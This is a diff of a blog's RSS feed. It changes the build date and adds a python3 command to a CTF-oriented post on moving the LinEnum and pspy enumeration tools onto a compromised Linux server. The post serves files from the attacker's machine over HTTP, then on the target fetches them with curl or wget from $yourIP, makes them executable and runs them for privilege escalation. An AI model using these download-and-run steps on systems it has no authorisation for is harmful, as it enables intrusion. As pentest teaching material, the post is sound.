@@ -13,7 +13,7 @@
     <ttl>1440</ttl>
     <generator>After Dark 8.0.2 (Hugo 0.54.0)</generator>
     <language>en-US</language>
-    <lastBuildDate>Sun, 21 Jul 2019 12:05:19 UT</lastBuildDate>
+    <lastBuildDate>Sun, 21 Jul 2019 15:52:02 UT</lastBuildDate>
     <atom:link href="https://domain.example/categories/post/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Upload enumeration tools to a linux server</title>
@@ -29,7 +29,7 @@ You&amp;rsquo;ll notice in these guides that, to find the mistakes that will get
 I have a very limited experience in Windows privesc so I will explain how to upload enumeration tools to Linux servers only in this post. The tools From my Tools list, you&amp;rsquo;ll find these two very useful enumeration tools:
 pspy pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.  LinEnum Scripted Local Linux Enumeration &amp; Privilege Escalation Checks.  The command lines So now that we have the tools on our computer, how to get them to the compromised server?
 Quite simple: we will use a python module called SimpleHTTPServer. It is normally used like other modules in python programs, but the SimpleHTTPServer module can also be invoked directly using the -m switch of the interpreter with a port number argument. This serves the files relative to the current directory.
-python -m SimpleHTTPServer 80  Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!
+python -m SimpleHTTPServer 80  With python3: python3 -m http.server 80  Now anyone with your IP address and this port number can access this directory and its files through HTTP request, including the compromised server!
 So we launch the SimpleHTTPServer from the directory where we have our LinEnum and pspy programs. And from the compromised linux server, we write: curl $yourIP/linenum.sh  cURL is a command-line tool for getting or sending data including files using URL syntax. Now your downloaded program won&amp;rsquo;t have the permission to run so to make it executable, write: chmod &#43;x linenum.sh  And now to execute it, write &amp;ldquo;./linenum.sh&amp;rdquo; in the server directory where the downloaded linenum program is.
 Sometimes, curl will not be authorized to be used by the user you compromised, but you can use wget in this case. Let&amp;rsquo;s use pspy this time as an example: wget $yourIP/pspy64  Same thing now, we do &amp;ldquo;chmod &#43;x pspy64&amp;rdquo; and then &amp;ldquo;./pspy64&amp;rdquo;, and it will run!
 I hope this was a useful article! There are probably other ways to upload files to a server such as using netcat, but I found the commands in this post to be the simplest for me. And of course I took the example of enumeration tools, but you can use it to upload many more useful tools you would need for your privesc!
